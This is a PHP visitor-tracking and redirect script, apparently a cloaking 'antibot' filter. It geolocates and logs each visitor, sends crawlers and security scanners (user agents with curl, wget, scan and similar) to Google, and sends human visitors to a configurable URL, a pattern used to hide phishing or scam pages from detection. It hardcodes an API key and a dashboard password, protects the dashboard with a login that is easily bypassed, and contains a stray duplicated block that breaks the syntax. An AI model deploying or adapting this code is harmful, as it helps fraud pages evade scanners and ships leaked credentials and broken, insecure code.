<?php
// Enable error reporting for debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Create necessary directories if they don't exist
$directories = [
    'include',
    'data',
    'assets',
    'assets/sounds',
    'assets/images',
    'assets/js',
    'assets/css',
    'dash'
];

foreach ($directories as $dir) {
    if (!file_exists($dir)) {
        mkdir($dir, 0755, true);
    }
}

// Log file path
$logFile = 'data/visitor_log.txt';

// Load configuration
$config = [];
if (file_exists('data/config.json')) {
    $config = json_decode(file_get_contents('data/config.json'), true);
} else {
    // Default configuration if config.json doesn't exist
    $config = [
        'bot_redirect' => 'https://www.google.com',
        'human_redirect' => 'https://fr.yahoo.com',
        'blocked_redirect' => 'https://www.google.com',
        'country_mode' => 'allow_all',
        'allowed_countries' => [],
        'blocked_countries' => []
    ];
    
    // Save default config
    file_put_contents('data/config.json', json_encode($config, JSON_PRETTY_PRINT));
}

// Function to get visitor's IP address
function getVisitorIP() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR']) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    return $ip;
}

// Function to detect operating system
function getOS() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $osArray = array(
        '/iphone/i' => 'iPhone iOS',
        '/ipad/i' => 'iPad iOS',
        '/ipod/i' => 'iPod iOS',
        '/ios/i' => 'iOS Device',
        '/android/i' => 'Android',
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($osArray as $regex => $value) {
        if (preg_match($regex, $userAgent)) {
            return $value;
        }
    }

      {
        if (preg_match($regex, $userAgent)) {
            return $value;
        }
    }

    return 'Unknown OS Platform';
}

// Function to detect if the visitor is a bot
function isBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $bots = array(
        'bot', 'spider', 'crawler', 'curl', 'wget', 'slurp', 'search', 
        'fetch', 'nutch', 'tracker', 'python-requests', 'libwww-perl', 
        'httpunit', 'vulnerable', 'scan', 'wordpress', 'joomla', 'drupal'
    );

    foreach ($bots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }

    return false;
}

// Function to get visitor information from the IP API
function getVisitorInfo($ip) {
    $apiUrl = "https://pro.ip-api.com/json/{$ip}?key=q3poiKwIfe238sl&fields=status,message,country,countryCode,regionName,city,isp,mobile,proxy,hosting";

    // Try to use curl if available
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            curl_close($ch);
            return getDefaultVisitorInfo();
        }

        curl_close($ch);
    } 
    // Fallback to file_get_contents if curl is not available
    else if (function_exists('file_get_contents')) {
        $context = stream_context_create([
            'http' => [
                'timeout' => 5,
            ],
        ]);
        $response = @file_get_contents($apiUrl, false, $context);
        
        if ($response === false) {
            return getDefaultVisitorInfo();
        }
    } 
    // If neither method is available, return default info
    else {
        return getDefaultVisitorInfo();
    }

    $data = json_decode($response, true);

    if (!$data || $data['status'] !== 'success') {
        return getDefaultVisitorInfo();
    }

    return $data;
}

// Default visitor info when API fails
function getDefaultVisitorInfo() {
    return [
        'status' => 'fail',
        'country' => 'Unknown',
        'countryCode' => 'XX',
        'regionName' => 'Unknown',
        'city' => 'Unknown',
        'isp' => 'Unknown',
        'mobile' => false,
        'proxy' => false,
        'hosting' => false
    ];
}

// Function to check if IP or ISP is blocked
function isBlocked($ip, $isp) {
    // Load blocked data
    $blockedFile = 'data/blocked.json';
    if (!file_exists($blockedFile)) {
        file_put_contents($blockedFile, json_encode(['blocked_ips' => [], 'blocked_isps' => []]));
        return false;
    }

    $blockedData = json_decode(file_get_contents($blockedFile), true);

    // Check if IP is blocked
    if (in_array($ip, $blockedData['blocked_ips'])) {
        return true;
    }

    // Check if ISP is blocked
    if (!empty($isp) && in_array($isp, $blockedData['blocked_isps'])) {
        return true;
    }

    return false;
}

// Function to check if country is allowed based on configuration
function isCountryAllowed($countryCode, $config) {
    // If no country filtering is enabled, allow all
    if ($config['country_mode'] === 'allow_all') {
        return true;
    }
    
    // If country code is unknown, default to allowing
    if (empty($countryCode) || $countryCode === 'XX') {
        return true;
    }
    
    // Check based on country mode
    if ($config['country_mode'] === 'allow_selected') {
        return in_array(strtolower($countryCode), $config['allowed_countries']);
    } else if ($config['country_mode'] === 'block_selected') {
        return !in_array(strtolower($countryCode), $config['allowed_countries']);
    }
    
    // Default to allowing if something goes wrong
    return true;
}

// Function to generate panel.html
function generatePanel() {
    // Check if panel_template.php exists, if not create it
    if (!file_exists('include/panel_template.php')) {
        // Use panel_template.php from the existing files
        if (file_exists('panel_template.php')) {
            copy('panel_template.php', 'include/panel_template.php');
        } else {
            // Create a minimal panel template as fallback
            $panelTemplate = '<!DOCTYPE html><html><head><title>Visitor Panel</title></head><body><h1>Visitor Panel</h1><p>No visitors data available yet.</p></body></html>';
            file_put_contents('include/panel_template.php', $panelTemplate);
        }
    }
    
    // Include the panel_template.php file
    ob_start();
    include('include/panel_template.php');
    $panelContent = ob_get_clean();
    
    // Create dash directory if it doesn't exist
    if (!file_exists('dash')) {
        mkdir('dash', 0755, true);
    }
    
    // Save the panel content to dash/index.html
    file_put_contents('dash/index.html', $panelContent);
}

// Handle API requests for block/unblock/clear
if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'block_visitor':
            // Get the block type and value from the request
            $blockType = isset($_POST['block_type']) ? $_POST['block_type'] : '';
            $blockValue = isset($_POST['block_value']) ? $_POST['block_value'] : '';

            // Validate input
            if (empty($blockType) || empty($blockValue) || !in_array($blockType, ['ip', 'isp'])) {
                echo json_encode(['success' => false, 'message' => 'Invalid block parameters']);
                exit;
            }

            // Load the current blocked list
            $blockedFile = 'data/blocked.json';
            if (!file_exists($blockedFile)) {
                file_put_contents($blockedFile, json_encode(['blocked_ips' => [], 'blocked_isps' => []]));
            }

            $blockedData = json_decode(file_get_contents($blockedFile), true);

            // Add the new value to the appropriate list if it's not already there
            if ($blockType === 'ip') {
                if (!in_array($blockValue, $blockedData['blocked_ips'])) {
                    $blockedData['blocked_ips'][] = $blockValue;
                }
            } else { // isp
                if (!in_array($blockValue, $blockedData['blocked_isps'])) {
                    $blockedData['blocked_isps'][] = $blockValue;
                }
            }

            // Save the updated blocked list
            file_put_contents($blockedFile, json_encode($blockedData, JSON_PRETTY_PRINT));

            // Return success response
            echo json_encode([
                'success' => true, 
                'message' => ($blockType === 'ip' ? 'IP' : 'ISP') . ' ' . htmlspecialchars($blockValue) . ' has been blocked successfully'
            ]);
            exit;
            
        case 'unblock_visitor':
            // Get the unblock type and value from the request
            $unblockType = isset($_POST['unblock_type']) ? $_POST['unblock_type'] : '';
            $unblockValue = isset($_POST['unblock_value']) ? $_POST['unblock_value'] : '';

            // Validate input
            if (empty($unblockType) || empty($unblockValue) || !in_array($unblockType, ['ip', 'isp'])) {
                echo json_encode(['success' => false, 'message' => 'Invalid unblock parameters']);
                exit;
            }

            // Load the current blocked list
            $blockedFile = 'data/blocked.json';
            if (!file_exists($blockedFile)) {
                echo json_encode(['success' => false, 'message' => 'Blocked list file not found']);
                exit;
            }

            $blockedData = json_decode(file_get_contents($blockedFile), true);

            // Remove the value from the appropriate list
            if ($unblockType === 'ip') {
                $key = array_search($unblockValue, $blockedData['blocked_ips']);
                if ($key !== false) {
                    array_splice($blockedData['blocked_ips'], $key, 1);
                } else {
                    echo json_encode(['success' => false, 'message' => 'IP address not found in blocked list']);
                    exit;
                }
            } else { // isp
                $key = array_search($unblockValue, $blockedData['blocked_isps']);
                if ($key !== false) {
                    array_splice($blockedData['blocked_isps'], $key, 1);
                } else {
                    echo json_encode(['success' => false, 'message' => 'ISP not found in blocked list']);
                    exit;
                }
            }

            // Save the updated blocked list
            if (file_put_contents($blockedFile, json_encode($blockedData, JSON_PRETTY_PRINT))) {
                echo json_encode([
                    'success' => true, 
                    'message' => ($unblockType === 'ip' ? 'IP' : 'ISP') . ' ' . htmlspecialchars($unblockValue) . ' has been unblocked successfully'
                ]);
            } else {
                echo json_encode(['success' => false, 'message' => 'Failed to update blocked list']);
            }
            exit;
            
        case 'clear_visits':
            // Clear the visitor log file
            if (file_exists('data/visitor_log.txt')) {
                if (file_put_contents('data/visitor_log.txt', '') === false) {
                    echo json_encode(['success' => false, 'message' => 'Failed to clear visitor_log.txt']);
                    exit;
                }
            }

            // Clear visitors.json if it exists
            if (file_exists('data/visitors.json')) {
                if (file_put_contents('data/visitors.json', '[]') === false) {
                    echo json_encode(['success' => false, 'message' => 'Failed to clear visitors.json']);
                    exit;
                }
            }

            // Regenerate the panel.html with empty data
            try {
                generatePanel();
            } catch (Exception $e) {
                echo json_encode(['success' => false, 'message' => 'Error regenerating panel: ' . $e->getMessage()]);
                exit;
            }

            // Return success message
            echo json_encode(['success' => true, 'message' => 'All visitor logs have been cleared successfully.']);
            exit;
            
        case 'login':
            // Simple login without sessions
            $password = "44feff10EE";
            $error = "";

            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                $input_password = isset($_POST["password"]) ? $_POST["password"] : "";
                if ($input_password === $password) {
                    header("Location: dash/index.html");
                    exit;
                } else {
                    $error = "Incorrect password";
                }
            }
            
            // Output login form
            include('include/login_template.php');
            exit;
            
        case 'logout':
            // Redirect to login page
            header('Location: index.php?action=login');
            exit;
    }
}

// Main visitor tracking logic
try {
    // Get visitor information
    $ip = getVisitorIP();
    $os = getOS();
    $isBot = isBot();
    $visitorInfo = getVisitorInfo($ip);

    // Extract ISP information from the API response
    $isp = $visitorInfo['isp'] ?? 'Unknown';
    $countryCode = $visitorInfo['countryCode'] ?? 'XX';

    // Check if visitor is blocked
    $isBlocked = isBlocked($ip, $isp);

    // Check if country is allowed
    $isCountryAllowed = isCountryAllowed($countryCode, $config);

    // Prepare visitor data
    $visitorData = [
        'ip' => $ip,
        'country' => $visitorInfo['country'] ?? 'Unknown',
        'country_code' => strtolower($countryCode),
        'region' => $visitorInfo['regionName'] ?? 'Unknown',
        'city' => $visitorInfo['city'] ?? 'Unknown',
        'isp' => $isp,
        'os' => $os,
        'is_bot' => $isBot,
        'is_mobile' => $visitorInfo['mobile'] ?? false,
        'is_proxy' => $visitorInfo['proxy'] ?? false,
        'is_hosting' => $visitorInfo['hosting'] ?? false,
        'timestamp' => date('Y-m-d H:i:s'),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'id' => uniqid() // Add unique ID for each visitor
    ];

    // Log visitor data
    $logEntry = json_encode($visitorData) . "\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND);

    // Generate panel.html
    generatePanel();

    // Determine redirect URL based on visitor status
    if ($isBlocked) {
        // Redirect blocked visitors
        header('Location: ' . $config['blocked_redirect']);
    } else if (!$isCountryAllowed) {
        // Redirect visitors from blocked countries
        header('Location: ' . $config['blocked_redirect']);
    } else if ($isBot) {
        // Redirect bots
        header('Location: ' . $config['bot_redirect']);
    } else {
        // Redirect human visitors
        header('Location: ' . $config['human_redirect']);
    }
} catch (Exception $e) {
    // Log error and redirect to Google as fallback
    error_log("Error in visitor tracking: " . $e->getMessage());
    header('Location: https://www.google.com');
}
exit;
?>

